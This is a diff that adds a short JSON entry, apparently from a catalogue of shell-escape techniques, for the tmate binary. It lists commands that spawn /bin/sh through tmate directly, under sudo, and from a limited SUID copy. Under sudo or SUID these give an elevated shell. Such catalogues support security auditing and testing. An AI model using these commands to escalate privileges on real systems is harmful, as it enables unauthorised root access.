@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "tmate -c /bin/sh\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo tmate -c /bin/sh\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        
+        "code": "./tmate -c /bin/sh\n"
+      }
+    ]
+  }
+}
